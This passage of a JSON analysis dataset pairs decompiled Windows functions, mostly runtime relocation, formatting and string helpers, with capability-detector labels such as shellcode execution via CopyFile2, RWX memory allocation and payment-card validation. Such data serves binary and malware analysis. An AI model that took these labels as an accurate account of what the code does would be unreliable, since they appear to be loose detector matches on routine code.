   }\n    uStack256 = 0x1400056f8;\n    fcn.140006f30(uVar9);\ncode_r0x0001400056f8:\n    uVar21 = 1;\n    pcVar12 = 0x14006e50d;\n    *puStack216 = 1;\n    *0x20 = &stack0xffffffffffffff00;\n    uStack256 = 0x14000571a;\n    unaff_RBX = uVar9;\n    unaff_RSI = arg3;\n    unaff_RDI = in_stack_00000028;\ncode_r0x0001400051c0:\n    *(*0x20 + -8) = unaff_RDI;\n    *(*0x20 + -0x10) = unaff_RSI;\n    *(*0x20 + -0x18) = unaff_RBX;\n    if (uVar21 < 0x1c) {\n        uVar6 = 0;\n    }\n    else {\n        iVar8 = 4;\n        uVar6 = 0;\n        do {\n            iVar8 = iVar8 * 2;\n            uVar6 = uVar6 + 1;\n        } while (iVar8 + 0x17 < uVar21);\n    }\n    *(*0x20 + -0x40) = 0x1400051f4;\n    puVar14 = fcn.140006e40(uVar6);\n    *puVar14 = uVar6;\n    uVar18 = *pcVar12;\n    *(puVar14 + 1) = uVar18;\n    puVar16 = puVar14 + 1;\n    while (uVar18 != 0) {\n        pcVar12 = pcVar12 + 1;\n        uVar18 = *pcVar12;\n        puVar16 = puVar16 + 1;\n        *puVar16 = uVar18;\n    }\n    if (ppuStack208 != NULL) {\n        *ppuStack208 = puVar16;\n    }\n    return puVar14 + 1;\n}\n",
        "token_count": 11906
    },
    "140006d1": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x000140006ddb)\n// WARNING: Removing unreachable block (ram,0x000140006dc0)\n// WARNING: Removing unreachable block (ram,0x000140006dcc)\n\nvoid fcn.140006d10(ulong arg1)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    \n    pcVar2 = _sym.imp.KERNEL32.dll_Sleep;\n    pcVar1 = _sym.imp.KERNEL32.dll_InitializeCriticalSection;\n    if (*0x140071bb0 != 2) {\n        if (*0x140071bb0 != 0) {\n            if (*0x140071bb0 == 1) {\n                do {\n                    (*pcVar2)(1);\n                } while (*0x140071bb0 == 1);\n                if (*0x140071bb0 == 2) goto code_r0x000140006da6;\n            }\n            return;\n        }\n        *0x140071bb0 = 1;\n        (*_sym.imp.KERNEL32.dll_InitializeCriticalSection)(0x140071bc0);\n        (*pcVar1)(0x140071be8);\n        fcn.1400014f0(0x140006df0);\n        *0x140071bb0 = 2;\n    }\ncode_r0x000140006da6:\n    // WARNING: Could not recover jumptable at 0x000140006db8. Too many branches\n    // WARNING: Treating indirect jump as call\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(arg1 * 0x28 + 0x140071bc0);\n    return;\n}\n",
        "token_count": 361
    },
    "14000798": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint64_t fcn.140007980(char *arg1, uint64_t arg2)\n\n{\n    char *pcVar1;\n    uint64_t uVar2;\n    \n    uVar2 = 0;\n    pcVar1 = arg1;\n    if (arg2 != 0) {\n        do {\n            if (*pcVar1 == '\\0') {\n                return uVar2;\n            }\n            pcVar1 = pcVar1 + 1;\n            uVar2 = pcVar1 - arg1;\n        } while (uVar2 < arg2);\n    }\n    return uVar2;\n}\n",
        "token_count": 130
    },
    "1400079b": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint64_t fcn.1400079b0(int64_t arg1, int64_t arg2)\n\n{\n    int64_t iVar1;\n    \n    iVar1 = 0;\n    if (arg2 != 0) {\n        do {\n            if (*(arg1 + iVar1 * 2) == 0) {\n                return iVar1;\n            }\n            iVar1 = iVar1 + 1;\n        } while (arg2 != iVar1);\n    }\n    return arg2;\n}\n",
        "token_count": 105
    },
    "140007c2": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nulong fcn.140007c20(uint16_t *arg1, uint32_t *arg2, int64_t arg3, uint32_t *arg4)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    int32_t in_stack_00000028;\n    uint32_t in_stack_00000030;\n    uint32_t auStack28 [3];\n    \n    if (arg2 == NULL) {\n        return 0;\n    }\n    if (arg3 == 0) {\n        return 0xfffffffe;\n    }\n    auStack28[0] = *arg4;\n    uVar1 = *arg2;\n    *arg4 = 0;\n    if (uVar1 == 0) {\n        *arg1 = 0;\n        return 0;\n    }\n    if (in_stack_00000030 < 2) {\ncode_r0x000140007cd8:\n        if (in_stack_00000028 == 0) {\n            *arg1 = *arg2;\n            return 1;\n        }\n        iVar2 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)(in_stack_00000028, 8, arg2, 1, arg1, 1);\n        if (iVar2 != 0) {\n            return 1;\n        }\n    }\n    else {\n        if (auStack28[0] == '\\0') {\n            iVar2 = (*_sym.imp.KERNEL32.dll_IsDBCSLeadByteEx)(in_stack_00000028);\n            if (iVar2 == 0) goto code_r0x000140007cd8;\n            if (arg3 == 1) {\n                *arg4 = *arg2;\n                return 0xfffffffe;\n            }\n        }\n        else {\n            auStack28[0]._0_2_ = CONCAT11(uVar1, auStack28[0]);\n            auStack28[0] = auStack28[0] & 0xffff0000 | auStack28[0];\n            arg2 = auStack28;\n        }\n        iVar2 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)(in_stack_00000028, 8, arg2, 2, arg1, 1);\n        if (iVar2 != 0) {\n            return 2;\n        }\n    }\n    puVar3 = sub.msvcrt.dll__errno();\n    *puVar3 = 0x2a;\n    return 0xffffffff;\n}\n",
        "token_count": 555
    },
    "140001e1": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "allocate memory",
            "allocate RWX memory",
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d",
            "allocate RW memory"
        ],
        "decompiled_code": "\nvoid fcn.140001e10(uint8_t **arg1)\n\n{\n    uint32_t *puVar1;\n    uint8_t uVar2;\n    uint16_t uVar3;\n    int32_t iVar4;\n    ulong uVar5;\n    ulong uVar6;\n    uint32_t *puVar7;\n    code *pcVar8;\n    int32_t iVar9;\n    uint8_t **ppuVar10;\n    uint *puVar11;\n    int64_t iVar12;\n    int32_t *piVar13;\n    uint uVar14;\n    char *arg1_00;\n    uint32_t uVar15;\n    uint64_t arg2;\n    uint32_t *puVar16;\n    int64_t iVar17;\n    int64_t iVar18;\n    uint8_t *puVar19;\n    uint8_t **arg1_01;\n    uint8_t **in_R8;\n    uint32_t uVar20;\n    uint8_t **in_R9;\n    ulong in_XMM2_Qa;\n    ulong in_XMM3_Qa;\n    ulong auStack336 [5];\n    uint auStack296 [2];\n    uint64_t uStack288;\n    uchar auStack280 [16];\n    ulong auStack264 [7];\n    uint8_t *apuStack208 [2];\n    uchar auStack192 [12];\n    uchar auStack180 [12];\n    uint8_t **ppuStack168;\n    int64_t iStack160;\n    int64_t iStack152;\n    uint8_t *apuStack72 [3];\n    uint8_t *puStack48;\n    int32_t iStack36;\n    \n    iStack160 = *0x140071154;\n    if (*0x140071154 < 1) goto code_r0x000140001f40;\n    in_R9 = NULL;\n    ppuVar10 = *0x140071158 + 0x18;\n    do {\n        in_R8 = *ppuVar10;\n        if ((in_R8 <= arg1) && (in_R8 = in_R8 + *(ppuVar10[1] + 8),  arg1 < in_R8)) {\n            return;\n        }\n        uVar20 = in_R9 + 1;\n        in_R9 = uVar20;\n        ppuVar10 = ppuVar10 + 5;\n    } while (uVar20 != *0x140071154);\n    while (iStack152 = fcn.140002860(arg1),  iStack152 != 0) {\n        arg1 = iStack160 * 0x28;\n        puVar11 = *0x140071158 + arg1;\n        *(puVar11 + 8) = iStack152;\n        *puVar11 = 0;\n        iVar12 = fcn.1400029a0();\n        iVar12 = iVar12 + *(iStack152 + 0xc);\n        *(*0x140071158 + 0x18 + arg1) = iVar12;\n        iVar12 = (*_sym.imp.KERNEL32.dll_VirtualQuery)(iVar12, apuStack72, 0x30);\n        if (iVar12 == 0) {\n            in_R8 = *(*0x140071158 + 0x18 + arg1);\n            fcn.140001da0(\"  VirtualQuery failed for %d bytes at address %p\", *(iStack152 + 8), in_R8, in_R9);\n            break;\n        }\n        if (((iStack36 - 0x40U & 0xffffffbf) == 0) || ((iStack36 - 4U & 0xfffffffb) == 0)) {\ncode_r0x000140001ede:\n            *0x140071154 = *0x140071154 + 1;\n            return;\n        }\n        in_R8 = 0x40;\n        if (iStack36 == 2) {\n            in_R8 = 0x4;\n        }\n        arg1 = arg1 + *0x140071158;\n        arg1[1] = apuStack72[0];\n        arg1[2] = puStack48;\n        in_R9 = arg1;\n        iVar9 = (*_sym.imp.KERNEL32.dll_VirtualProtect)();\n        if (iVar9 != 0) goto code_r0x000140001ede;\n        uVar20 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        fcn.140001da0(\"  VirtualProtect failed with code 0x%x\", uVar20, in_R8, in_R9);\ncode_r0x000140001f40:\n        iStack160 = 0;\n    }\n    arg1_00 = \"Address %p has no image-section\";\n    fcn.140001da0(\"Address %p has no image-section\", arg1, in_R8, in_R9);\n    iVar9 = *0x140071150;\n    if (*0x140071150 != 0) {\n        return;\n    }\n    *0x140071150 = 1;\n    auStack264[2] = 0x140001fc7;\n    ppuStack168 = arg1;\n    fcn.1400028e0();\n    auStack264[2] = 0x140001fde;\n    iVar12 = fcn.140002b40(arg1_00);\n    iVar17 = *0x14006e760;\n    puVar7 = *0x14006e730;\n    *0x140071154 = 0;\n    iVar12 = -iVar12;\n    *0x140071158 = auStack192 + iVar12;\n    if (*0x14006e730 - *0x14006e740 < 8) {\n        *0x140071154 = 0;\n        return;\n    }\n    puVar16 = *0x14006e740;\n    if (*0x14006e730 - *0x14006e740 < 0xc) {\ncode_r0x00014000201d:\n        if (*puVar16 == 0) {\n            uVar20 = puVar16[1];\ncode_r0x00014000202a:\n            if (uVar20 == 0) {\n                arg2 = puVar16[2];\n                if (puVar16[2] != 1) {\ncode_r0x0001400022ce:\n                    uVar14 = 0x4006e280;\n                    *(auStack264 + iVar12 + 0x10) = 0x1400022da;\n                    fcn.140001da0(\"  Unknown pseudo relocation protocol version %d.\\n\", arg2, in_R8, in_R9);\n                    if (*0x140071160 != NULL) {\n                        uVar5 = *(apuStack208 + iVar12 + 8);\n                        *(auStack296 + iVar12) = uVar14;\n                        *(&uStack288 + iVar12) = arg2;\n                        *(auStack280 + iVar12) = CONCAT88(in_XMM3_Qa, in_XMM2_Qa);\n                        *(auStack264 + iVar12) = uVar5;\n                        *(auStack336 + iVar12) = 0x140002318;\n                        (**0x140071160)(auStack296 + iVar12);\n                    }\n                    return;\n                }\n                puVar16 = puVar16 + 3;\n                if (*0x14006e730 <= puVar16) {\n                    *0x140071154 = 0;\n                    return;\n                }\n                do {\n                    while( true ) {\n                        uVar20 = puVar16[2];\n                        ppuVar10 = *puVar16 + iVar17;\n                        arg2 = uVar20;\n                        in_R9 = *ppuVar10;\n                        arg1_01 = puVar16[1] + iVar17;\n                        if ((uVar20 & 0xff) == 0x20) goto code_r0x0001400021f8;\n                        uVar15 = uVar20 & 0xff;\n                        if ((uVar20 & 0xff) < 0x21) break;\n                        if (uVar15 != 0x40) {\ncode_r0x0001400022c2:\n                            *(auStack264 + iVar12 + 0x10) = 0x1400022ce;\n                            fcn.140001da0(\"  Unknown pseudo relocation bit size %d.\\n\", arg2, in_R8, in_R9);\n                            goto code_r0x0001400022ce;\n                        }\n                        puVar19 = (*arg1_01 - ppuVar10) + in_R9;\n                        if (((uVar20 & 0xc0) == 0) && (-1 < puVar19)) goto code_r0x0001400021df;\n                        *(auStack264 + iVar12 + 0x10) = 0x140002248;\n                        fcn.140001e10(arg1_01);\n                        *arg1_01 = puVar19;\ncode_r0x0001400020a5:\n                        puVar16 = puVar16 + 3;\n                        if (puVar7 <= puVar16) goto code_r0x000140002140;\n                    }\n                    if (uVar15 == 8) {\n                        uVar2 = *arg1_01;\n                        if (uVar2 < '\\0') {\n                            iVar18 = (uVar2 | 0xffffffffffffff00) - ppuVar10;\n                        }\n                        else {\n                            iVar18 = uVar2 - ppuVar10;\n                        }\n                        puVar19 = iVar18 + in_R9;\n                        if (((uVar20 & 0xc0) == 0) && ((0xff < puVar19 || (puVar19 < -0x80)))) {\ncode_r0x0001400021df:\n                            do {\n                                *(apuStack208 + iVar12) = puVar19;\n                                uVar20 = 0x4006e2e8;\n                                *(auStack264 + iVar12 + 0x10) = 0x1400021f3;\n                                in_R8 = arg1_01;\n                                ppuVar10 = fcn.140001da0(\"%d bit pseudo relocation at %p out of range, targeting %p, yielding the value %p.\\n\"\n                                                         , arg2, arg1_01, in_R9);\ncode_r0x0001400021f8:\n                                uVar15 = *arg1_01;\n                                if (uVar15 < 0) {\n                                    iVar18 = (uVar15 | 0xffffffff00000000) - ppuVar10;\n                                }\n                                else {\n                                    iVar18 = uVar15 - ppuVar10;\n                                }\n                                puVar19 = iVar18 + in_R9;\n                            } while (((uVar20 & 0xc0) == 0) && ((puVar19 < -0x80000000 || (0xffffffff < puVar19))));\n                            *(auStack264 + iVar12 + 0x10) = 0x140002232;\n                            fcn.140001e10(arg1_01);\n                            *arg1_01 = puVar19;\n                        }\n                        else {\n                            *(auStack264 + iVar12 + 0x10) = 0x1400020a2;\n                            fcn.140001e10(arg1_01);\n                            *arg1_01 = puVar19;\n                        }\n                        goto code_r0x0001400020a5;\n                    }\n                    if (uVar15 != 0x10) goto code_r0x0001400022c2;\n                    uVar3 = *arg1_01;\n                    if (uVar3 < 0) {\n                        iVar18 = (uVar3 | 0xffffffffffff0000) - ppuVar10;\n                    }\n                    else {\n                        iVar18 = uVar3 - ppuVar10;\n                    }\n                    puVar19 = iVar18 + in_R9;\n                    if (((uVar20 & 0xc0) == 0) && ((puVar19 < -0x8000 || (0xffff < puVar19))))\n                    goto code_r0x0001400021df;\n                    puVar16 = puVar16 + 3;\n                    *(auStack264 + iVar12 + 0x10) = 0x14000212c;\n                    fcn.140001e10(arg1_01);\n                    *arg1_01 = puVar19;\n                } while (puVar16 < puVar7);\n                goto code_r0x000140002140;\n            }\n        }\n    }\n    else if (**0x14006e740 == 0) {\n        uVar20 = (*0x14006e740)[1];\n        if ((uVar20 | (*0x14006e740)[2]) == 0) {\n            puVar16 = *0x14006e740 + 3;\n            goto code_r0x00014000201d;\n        }\n        goto code_r0x00014000202a;\n    }\n    if (*0x14006e730 <= puVar16) {\n        *0x140071154 = 0;\n        return;\n    }\n    do {\n        puVar1 = puVar16 + 1;\n        uVar20 = *puVar16;\n        puVar16 = puVar16 + 2;\n        piVar13 = *puVar1 + iVar17;\n        iVar4 = *piVar13;\n        *(auStack264 + iVar12 + 0x10) = 0x1400022b6;\n        fcn.140001e10(piVar13);\n        *piVar13 = uVar20 + iVar4;\n    } while (puVar16 < puVar7);\ncode_r0x000140002140:\n    pcVar8 = _sym.imp.KERNEL32.dll_VirtualProtect;\n    if (0 < *0x140071154) {\n        iVar17 = 0;\n        do {\n            piVar13 = *0x140071158 + iVar17;\n            iVar4 = *piVar13;\n            if (iVar4 != 0) {\n                uVar5 = *(piVar13 + 4);\n                uVar6 = *(piVar13 + 2);\n                *(auStack264 + iVar12 + 0x10) = 0x14000217f;\n                (*pcVar8)(uVar6, uVar5, iVar4, auStack180);\n            }\n            iVar9 = iVar9 + 1;\n            iVar17 = iVar17 + 0x28;\n        } while (iVar9 < *0x140071154);\n    }\n    return;\n}\n",
        "token_count": 3166
    },
    "1400046b": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint32_t fcn.1400046b0(ulong arg1, int64_t arg2, ulong arg3, char *arg4)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint8_t uVar4;\n    uint *puVar5;\n    ulong arg1_00;\n    int64_t iVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    float10 *pfVar9;\n    int16_t iVar10;\n    uint64_t uVar11;\n    uint64_t uVar12;\n    uint16_t uVar13;\n    uint8_t *puVar14;\n    uint8_t *puVar15;\n    char16_t *arg1_01;\n    uint8_t *puVar16;\n    int32_t iVar17;\n    int32_t *piVar18;\n    float10 fVar19;\n    float10 **in_stack_00000028;\n    uint64_t uStack200;\n    uint16_t uStack192;\n    unkbyte6 Stack190;\n    float10 afStack168 [3];\n    ushort uStack138;\n    float10 *apfStack136 [2];\n    int64_t iStack120;\n    uint32_t uStack112;\n    int32_t iStack108;\n    int32_t iStack104;\n    uint uStack100;\n    ushort uStack96;\n    int32_t iStack92;\n    ushort uStack88;\n    uint32_t uStack84;\n    int32_t iStack80;\n    uint uStack76;\n    \n    puVar5 = sub.msvcrt.dll__errno();\n    uVar7 = *arg4;\n    arg1._0_4_ = arg1 & 0x6000;\n    uVar1 = *puVar5;\n    iStack80 = arg3;\n    puVar14 = arg4 + 1;\n    iStack104 = -1;\n    uStack100 = 0xfffffffd;\n    uStack96 = 0;\n    iStack108 = -1;\n    iStack92 = 0;\n    uStack88 = 0;\n    uStack84 = 0;\n    uStack76 = 0xffffffff;\n    if (*arg4 == '\\0') {\n        return uVar7;\n    }\n    iStack120 = arg2;\n    uStack112 = arg1;\n    uVar8 = uVar7;\ncode_r0x0001400047ae:\n    uVar3 = uStack84;\n    if (uVar7 == 0x25) {\n        uVar4 = *puVar14;\n        iStack108 = -1;\n        iStack104 = -1;\n        if (uVar4 == 0) {\n            return uStack84;\n        }\n        iVar17 = 0;\n        uVar7 = 0;\n        puVar15 = puVar14;\n        piVar18 = &iStack108;\n        uStack112 = arg1;\n        do {\n            puVar16 = puVar15 + 1;\n            uVar8 = uVar4;\n    // switch table (91 cases) at 0x14006e390\n            switch(uVar4) {\n            case 0x20:\n                if (uVar7 != 0) goto code_r0x000140004850;\n                uVar4 = puVar15[1];\n                uStack112 = uStack112 | 0x40;\n                break;\n            default:\n                if ((9 < uVar4 - 0x30) || (3 < uVar7)) {\ncode_r0x000140004a27:\n                    fcn.140002ca0(0x25, &iStack120);\n                    puVar16 = puVar14;\n                    goto code_r0x00014000479c;\n                }\n                if (uVar7 == 0) {\n                    uVar7 = 1;\n                }\n                else {\ncode_r0x000140004f69:\n                    if (uVar7 == 2) {\n                        uVar7 = 3;\n                    }\n                }\n                if (piVar18 != NULL) {\n                    if (*piVar18 < 0) {\n                        uVar4 = puVar15[1];\n                        *piVar18 = uVar8 - 0x30;\n                        break;\n                    }\n                    *piVar18 = (uVar8 - 0x30) + *piVar18 * 10;\n                }\ncode_r0x000140004850:\n                uVar4 = puVar15[1];\n                break;\n            case 0x23:\n                if (uVar7 != 0) goto code_r0x000140004850;\n                uVar4 = puVar15[1];\n                uStack112 = uStack112 | 0x800;\n                break;\n            case 0x25:\n                goto code_r0x000140004dca;\n            case 0x27:\n                if (uVar7 != 0) goto code_r0x000140004850;\n                uStack112 = uStack112 | 0x1000;\n                apfStack136[0] = apfStack136[0] & 0xffffffff00000000;\n                iVar6 = sub.msvcrt.dll_localeconv();\n                iStack92 = fcn.140007d80(&uStack138, *(iVar6 + 8), 0x10, apfStack136);\n                if (0 < iStack92) {\n                    uStack88 = uStack138;\n                }\n                uVar4 = puVar15[1];\n                break;\n            case 0x2a:\n                if (piVar18 == NULL) {\ncode_r0x000140004c29:\n                    uVar4 = puVar15[1];\n                    uVar7 = 4;\n                }\n                else if ((uVar7 & 0xfffffffd) == 0) {\n                    iVar2 = *in_stack_00000028;\n                    in_stack_00000028 = in_stack_00000028 + 1;\n                    *piVar18 = iVar2;\n                    if (iVar2 < 0) {\n                        if (uVar7 != 0) {\n                            uVar4 = puVar15[1];\n                            piVar18 = NULL;\n                            iStack104 = -1;\n                            uVar7 = 2;\n                            break;\n                        }\n                        uStack112 = uStack112 | 0x400;\n                        iStack108 = -iStack108;\n                    }\n                    uVar4 = puVar15[1];\n                    piVar18 = NULL;\n                }\n                else {\n                    uVar4 = puVar15[1];\n                    piVar18 = NULL;\n                    uVar7 = 4;\n                }\n                break;\n            case 0x2b:\n                if (uVar7 != 0) goto code_r0x000140004850;\n                uVar4 = puVar15[1];\n                uStack112 = uStack112 | 0x100;\n                break;\n            case 0x2d:\n                if (uVar7 != 0) goto code_r0x000140004850;\n                uVar4 = puVar15[1];\n                uStack112 = uStack112 | 0x400;\n                break;\n            case 0x2e:\n                if (1 < uVar7) goto code_r0x000140004c29;\n                uVar4 = puVar15[1];\n                uVar7 = 2;\n                iStack104 = 0;\n                piVar18 = &iStack104;\n                break;\n            case 0x30:\n                if (uVar7 != 0) {\n                    if (uVar7 != 4) {\n                        uVar8 = 0x30;\n                        goto code_r0x000140004f69;\n                    }\n                    goto code_r0x000140004a27;\n                }\n                uVar4 = puVar15[1];\n                uStack112 = uStack112 | 0x200;\n                break;\n            case 0x41:\n                pfVar9 = *in_stack_00000028;\n                if ((uStack112 & 4) != 0) goto code_r0x000140004a6e;\ncode_r0x000140004c68:\n                uVar7 = pfVar9;\n                uVar8 = pfVar9 >> 0x20;\n                if (((-uVar7 | uVar7) >> 0x1f | uVar8 & 0x7fffffff) < 0x7ff00001) {\n                    fVar19 = pfVar9;\n                    uStack200 = SUB108(fVar19, 0);\n                    uStack192 = fVar19 >> 0x40;\n                    uVar12 = CONCAT62(Stack190, uStack192);\n                    if (fVar19 < 0) {\n                        uStack112 = uStack112 | 0x80;\n                    }\n                    uVar7 = uVar8 & 0xfffff | uVar7;\n                    if ((uVar7 == 0 && (uVar8 & 0x7ff00000) == 0x7ff00000) && ((uVar7 | uVar8 & 0x7ff00000) != 0)) {\n                        fcn.140003030(uVar12 & 0x8000, 0x14006e38a, &iStack120);\n                        goto code_r0x000140004b80;\n                    }\n                    uVar11 = uVar12 & 0xffffffffffff7fff;\n                    if ((fVar19 & 0x7fff) == 0) {\ncode_r0x000140004ff9:\n                        uVar12 = uVar12 & 0xffff7fff;\n                        if (uStack200 != 0) {\n                            uVar12 = 0xfffffc05;\n                        }\n                    }\n                    else {\n                        iVar10 = uVar11;\n                        if (iVar10 == 0x3c00 || SBORROW2(uStack192 & 0x7fff, 0x3c00) != iVar10 + -0x3c00 < 0) {\n                            uStack200 = uStack200 >> (0x3c01 - iVar10 & 0x3f);\n                            uVar11 = uVar11 + (0x3c01 - iVar10);\n                        }\n                        else if (iVar10 == 0) goto code_r0x000140004ff9;\n                        uVar12 = uVar11 & 0xffffffffffff0000 | uVar11 + 0xc004;\n                    }\n                    uStack200 = uStack200 >> 3;\n                    goto code_r0x000140004f07;\n                }\ncode_r0x000140004f7b:\n                fcn.140003030(0, 0x14006e386, &iStack120);\n                goto code_r0x000140004b80;\n            case 0x43:\n                goto code_r0x000140004d0f;\n            case 0x45:\n                pfVar9 = *in_stack_00000028;\n                if ((uStack112 & 4) != 0) goto code_r0x000140004bd1;\ncode_r0x000140004d47:\n                afStack168[0] = pfVar9;\n                fcn.140003f10(afStack168, &iStack120);\n                goto code_r0x000140004b80;\n            case 0x46:\n                pfVar9 = *in_stack_00000028;\n                if ((uStack112 & 4) != 0) goto code_r0x000140004ba3;\ncode_r0x000140004d78:\n                afStack168[0] = pfVar9;\n                fcn.140003fb0(afStack168, &iStack120);\n                goto code_r0x000140004b80;\n            case 0x47:\n                pfVar9 = *in_stack_00000028;\n                if ((uStack112 & 4) != 0) goto code_r0x000140004b6b;\ncode_r0x000140004da9:\n                afStack168[0] = pfVar9;\n                fcn.140004090(afStack168, &iStack120);\n                goto code_r0x000140004b80;\n            case 0x49:\n                uVar4 = puVar15[1];\n                if (uVar4 == 0x36) {\n                    if (puVar15[2] != 0x34) goto code_r0x000140004a27;\n                    uVar4 = puVar15[3];\n                    iVar17 = 3;\n                    puVar16 = puVar15 + 3;\n                    uVar7 = 4;\n                }\n                else if (uVar4 == 0x33) {\n                    if (puVar15[2] != 0x32) goto code_r0x000140004a27;\n                    uVar4 = puVar15[3];\n                    iVar17 = 2;\n                    puVar16 = puVar15 + 3;\n                    uVar7 = 4;\n                }\n                else {\n                    iVar17 = 3;\n                    uVar7 = 4;\n                }\n                break;\n            case 0x4c:\n                uVar4 = puVar15[1];\n                uStack112 = uStack112 | 4;\n                uVar7 = 4;\n                break;\n            case 0x53:\ncode_r0x000140004f1a:\n                arg1_01 = *in_stack_00000028;\n                if (arg1_01 == NULL) {\n                    arg1_01 = L\"(null)\";\n                }\n                if (iStack104 < 0) {\n                    uVar7 = sub.msvcrt.dll_wcslen(arg1_01);\n                    fcn.140002d00(arg1_01, uVar7, &iStack120);\n                }\n                else {\n                    uVar7 = fcn.1400079b0(arg1_01, iStack104);\n                    fcn.140002d00(arg1_01, uVar7, &iStack120);\n                }\n                goto code_r0x000140004b49;\n            case 0x58:\n            case 0x6f:\n            case 0x75:\n            case 0x78:\n                uStack112 = uStack112 & 0xfffffeff;\n                if (iVar17 == 3) {\n                    apfStack136[0] = *in_stack_00000028;\n                }\n                else if (iVar17 == 2) {\n                    apfStack136[0] = *in_stack_00000028;\n                }\n                else {\n                    uVar7 = *in_stack_00000028;\n                    if (iVar17 == 1) {\n                        apfStack136[0] = uVar7 & 0xffff;\n                    }\n                    else {\n                        apfStack136[0] = uVar7 & 0xff;\n                        if (iVar17 != 5) {\n                            apfStack136[0] = uVar7;\n                        }\n                    }\n                }\n                if (uVar8 == 0x75) {\n                    fcn.140003580(apfStack136[0], &iStack120);\n                }\n                else {\n                    fcn.1400030d0(uVar8, apfStack136[0], &iStack120);\n                }\n                goto code_r0x000140004b80;\n            case 0x61:\n                pfVar9 = *in_stack_00000028;\n                uVar8 = uStack112 | 0x20;\n                uVar7 = uStack112 & 4;\n                uStack112 = uVar8;\n                if (uVar7 == 0) goto code_r0x000140004c68;\ncode_r0x000140004a6e:\n                uVar7 = *(pfVar9 + 8);\n                uStack200 = *pfVar9;\n                uVar13 = uVar7;\n                uVar8 = uStack200 >> 0x20 & 0x7fffffff | uStack200;\n                if (0xfffe - ((-uVar8 | uVar8) >> 0x1f | uVar13 * 2 & 0xffffU) >> 0x10 != 0) goto code_r0x000140004f7b;\n                if (uVar13 < 0) {\n                    uStack112 = uStack112 | 0x80;\n                }\n                uVar12 = uVar7 & 0xffffffffffff7fff;\n                if ((uVar7 & 0x7fff) == 0) {\n                    if (uStack200 != 0) {\n                        uVar12 = 0xffffc002;\n                    }\n                }\n                else {\n                    if (((uVar13 & 0x7fff) == 0x7fff) && (uVar8 == 0)) {\n                        fcn.140003030(uVar13 & 0x8000, 0x14006e38a, &iStack120);\n                        goto code_r0x000140004b80;\n                    }\n                    uVar12 = uVar7 & 0xffffffffffff0000 | uVar12 + 0xc001;\n                }\ncode_r0x000140004f07:\n                fcn.140004210(uStack200, uVar12, &iStack120);\n                goto code_r0x000140004b80;\n            case 99:\n                iStack104 = -1;\n                if (iVar17 - 2U < 2) {\ncode_r0x000140004d0f:\n                    iStack104 = -1;\n                    apfStack136[0] = apfStack136[0] & 0xffffffffffff0000 | *in_stack_00000028;\n                    fcn.140002d00(apfStack136, 1, &iStack120);\n                    in_stack_00000028 = in_stack_00000028 + 1;\n                }\n                else {\n                    apfStack136[0] = apfStack136[0] & 0xffffffffffffff00 | *in_stack_00000028;\n                    fcn.140002e90(apfStack136, 1, &iStack120);\n                    in_stack_00000028 = in_stack_00000028 + 1;\n                }\n                goto code_r0x00014000479c;\n            case 100:\n            case 0x69:\n                uStack112 = uStack112 | 0x80;\n                if (iVar17 == 3) {\n                    pfVar9 = *in_stack_00000028;\n                }\n                else {\n                    iVar2 = *in_stack_00000028;\n                    pfVar9 = iVar2;\n                    if (iVar17 != 2) {\n                        if (iVar17 == 1) {\n                            pfVar9 = iVar2;\n                        }\n                        else if (iVar17 == 5) {\n                            pfVar9 = iVar2;\n                        }\n                    }\n                }\n                fcn.140003580(pfVar9, &iStack120);\n                in_stack_00000028 = in_stack_00000028 + 1;\n                goto code_r0x00014000479c;\n            case 0x65:\n                pfVar9 = *in_stack_00000028;\n                uVar8 = uStack112 | 0x20;\n                uVar7 = uStack112 & 4;\n                uStack112 = uVar8;\n                if (uVar7 == 0) goto code_r0x000140004d47;\ncode_r0x000140004bd1:\n                afStack168[0] = *pfVar9;\n                fcn.140003f10(afStack168, &iStack120);\n                goto code_r0x000140004b80;\n            case 0x66:\n                pfVar9 = *in_stack_00000028;\n                uVar8 = uStack112 | 0x20;\n                uVar7 = uStack112 & 4;\n                uStack112 = uVar8;\n                if (uVar7 == 0) goto code_r0x000140004d78;\ncode_r0x000140004ba3:\n                afStack168[0] = *pfVar9;\n                fcn.140003fb0(afStack168, &iStack120);\n                goto code_r0x000140004b80;\n            case 0x67:\n                pfVar9 = *in_stack_00000028;\n                uVar8 = uStack112 | 0x20;\n                uVar7 = uStack112 & 